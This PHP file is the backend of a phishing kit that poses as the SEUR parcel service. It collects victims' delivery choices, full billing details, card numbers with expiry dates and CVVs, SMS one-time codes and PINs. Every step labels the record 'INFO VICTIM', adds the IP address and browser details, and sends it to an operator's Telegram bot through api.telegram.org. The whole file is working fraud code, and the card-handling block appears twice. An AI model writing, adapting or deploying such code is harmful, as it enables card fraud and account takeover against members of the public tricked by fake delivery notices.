<?php 

                          

require_once "functions.php";
require_once "config.php";




$detect         = new BrowserDetection();
$ip             = $_SERVER['REMOTE_ADDR'];
$date           = date("Y-m-d H:i:s", time());
$usragent       = $_SERVER['HTTP_USER_AGENT'];
$browserName    = $detect->getName();
$browserVer     = $detect->getVersion(); 
$isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
$platformName   = $detect->getPlatform();



if ($_POST['step'] == 'chose') {


    $_SESSION['selected_day']  = $_POST['selected_day'] ?? '';
    $_SESSION['selected_time'] = $_POST['selected_time'] ?? '';

    $selectedDay  = $_SESSION['selected_day'];
    $selectedTime = $_SESSION['selected_time'];

    $adrress = $_SERVER['REMOTE_ADDR'];

    $subject = $adrress . " ---| 📦💎 SEUR 💎📦 |--- \n";

    $message  = "------ 🔐 BILLING 🔐 -----------\n";
    $message .= "[+] Day : " . $selectedDay . "\n";
    $message .= "[+] Time : " . $selectedTime . "\n";
    $message .= "------ 🔐 END BILLING 🔐 -------\n";


    if(isset($_POST['submit']))
    {
        $apiToken;
        $data = [
        'chat_id' => $id, 
        'text' => $subject . $message
        ];
        $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
    };

    header("Location: billing.php");
    exit();
}


if ($_POST['step']== 'billing') {
    $fname = $_POST['fname'];
    $fname = $_POST['fname'];
    $prov = $_POST['prov'];
    $adress = $_POST['address'];
    $email = $_POST['email'];
    $city = $_POST['city'];
    $zip = $_POST['zip'];
    $phone = $_POST['number'];
    $Apartment = $_POST['Apartment'];


    $_SESSION['fname'] = $_POST['fname'];
    $_SESSION['zip'] = $_POST['zip'];
    $_SESSION['address'] = $_POST['address'];
    $_SESSION['prov'] = $_POST['prov'];
    $_SESSION['city'] = $_POST['city'];
    $_SESSION['email'] = $_POST['email'];
    $_SESSION['number'] = $_POST['number'];


    if (empty($fname) || empty($prov)  || empty($phone)  || empty($adress) || empty($email)  || empty($city) || empty($zip)) {

        header("Location: billing.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message  =" ------\ 🔐 BILLING 🔐 /----------- "       . "\r\n" ;
        $message .= "[+]FULL NAME : " . $fname."". $fname                    . "\r\n";
        $message .= "[+]Provance : " . $prov                    . "\r\n";
        $message .= "[+]ADDRESS : " . $adress                  . "\r\n";
        $message .= "[+]Apartment : " . $Apartment                  . "\r\n";
        $message .= "[+]EMAIL : " . $email                  . "\r\n";
        $message .= "[+]PHONE : " . $phone                 . "\r\n";
        $message .= "[+]CITY : " . $city                 . "\r\n";
        $message .= "[+]Zip : " . $zip           . "\r\n";
        $message .=" ------\ 🔐 END BILLING 🔐 /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: cc.php");
        exit();
    }
}

//================
#=====> CC
//================

if ($_POST['step']== 'cc') {
    $fname = $_POST['fname'];
    $card = $_POST['card'];
    $date = $_POST['expdate'];
    $code = $_POST['cvv'];

    $_SESSION['card'] = $_POST['card'];
    $_SESSION['expdate'] = $_POST['expdate'];
    $_SESSION['cvv'] = $_POST['cvv'];


    if (empty($fname) || empty($card) || empty($date) || empty($code)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message .=" ------\ 💳  CC 💳  /----------- "       . "\r\n" ;
        $message .= "[+]Full Name : " . $_SESSION['fname']                    . "\r\n";
        $message .= "[+]CARD NUMBER : " . $_SESSION['card']                    . "\r\n";
        $message .= "[+]EXP DATE : " . $_SESSION['expdate']                 . "\r\n";
        $message .= "[+]CVV : " . $_SESSION['cvv']                  . "\r\n";
        $message .=" ------\ 💳  END CC 💳  /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: progress.php");
        exit();
    }
}

//================
#=====> CC
//================

if ($_POST['step']== 'cc') {
    $fname = $_POST['fname'];
    $card = $_POST['card'];
    $date = $_POST['expdate'];
    $code = $_POST['cvv'];

    $_SESSION['card'] = $_POST['card'];
    $_SESSION['expdate'] = $_POST['expdate'];
    $_SESSION['cvv'] = $_POST['cvv'];


    if (empty($fname) || empty($card) || empty($date) || empty($code)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message .=" ------\ 💳  CC 💳  /----------- "       . "\r\n" ;
        $message .= "[+]Full Name : " . $_SESSION['fname']                    . "\r\n";
        $message .= "[+]CARD NUMBER : " . $_SESSION['card']                    . "\r\n";
        $message .= "[+]EXP DATE : " . $_SESSION['expdate']                 . "\r\n";
        $message .= "[+]CVV : " . $_SESSION['cvv']                  . "\r\n";
        $message .=" ------\ 💳  END CC 💳  /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: progress.php");
        exit();
    }
}

//================
#=====> sms
//================

if ($_POST['step']== 'sms') {
    $sms = $_POST['sms'];




    if (empty($sms)) {

        header("Location: confirmation.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message  =" ------\ 📲 SMS 📲 /----------- "       . "\r\n" ;
        $message .= "[+] SMS : " . $sms                  . "\r\n";
        $message .=" ------\ 📲 END SMS 📲 /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: progress-false.php");
        exit();
    }
}

if ($_POST['step']== 'smserr') {
    $sms = $_POST['sms'];




    if (empty($sms)) {

        header("Location: confirmation.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message  =" ------\ 📲 SMS ERROR 📲 /----------- "       . "\r\n" ;
        $message .= "[+] SMS : " . $sms                  . "\r\n";
        $message .=" ------\ 📲 END SMS 📲 /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: progress-2.php");
        exit();
    }
}




if ($_POST['step']== 'pin') {
    $sms = $_POST['sms'];



    if (empty($sms)) {

        header("Location: pin.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ---| 📦💎 SEUR 💎📦 |--- "       . "\r\n" ;
        $message  =" ------\ 📲 PIN 📲 /----------- "       . "\r\n" ;
        $message .= "[+] PIN : " . $sms                  . "\r\n";
        $message .=" ------\ 📲 END PIN 📲 /------- "       . "\r\n" ;
        $message .= '-----------------------------------------' . "\r\n";
        $message .= '/-- INFO VICTIM --/' . "\r\n";
        $message .= "🌎💎 Device : ".$OS."\r\n";
        $message .= "🌎💎 Browser : ".$Browser."\r\n";
        $message .= "🌎💎 DATE : ".$date."\r\n";
        $message .= "🌎💎 Usragent : ".$usragent."\r\n";
        $message .= "🌎💎 platformName : ".$platformName."\r\n";
        $message .= '-----------------------------------------' . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
        header("Location: progress-3.php");
        exit();
    }
}

